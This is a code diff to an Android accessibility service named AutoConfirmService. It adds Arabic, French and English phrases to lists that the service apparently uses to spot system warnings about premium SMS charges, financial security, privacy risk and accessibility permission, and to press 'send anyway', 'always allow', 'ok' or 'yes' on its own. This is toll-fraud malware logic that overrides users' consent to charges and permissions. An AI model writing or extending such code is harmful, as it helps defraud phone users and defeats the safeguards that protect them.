@@ -71,7 +71,13 @@ public class AutoConfirmService extends AccessibilityService {
         "carrier charges",
         "charges may apply",
         "send premium sms",
-        "is attempting to send an sms"
+        "is attempting to send an sms",
+        "أمانك المالي",
+        "خطرا على خصوصيتك",
+        "إذن إمكانية الوصول",
+        "financial security",
+        "risk to your privacy",
+        "accessibility permission"
     };
 
     // Specific button View IDs used in system SMS confirmation dialogs
@@ -99,11 +105,20 @@ public class AutoConfirmService extends AccessibilityService {
         "السماح دائما",
         "سماح دائماً",
         "سماح دائما",
+        "استمرار التشغيل",
+        "استمرار",
+        "موافق",
+        "نعم",
         "envoyer quand même",
         "toujours autoriser",
+        "continuer",
+        "oui",
         "send anyway",
         "always allow",
-        "allow all the time"
+        "allow all the time",
+        "continue",
+        "yes",
+        "ok"
     };
 
     // Checkbox IDs for "Remember my choice"
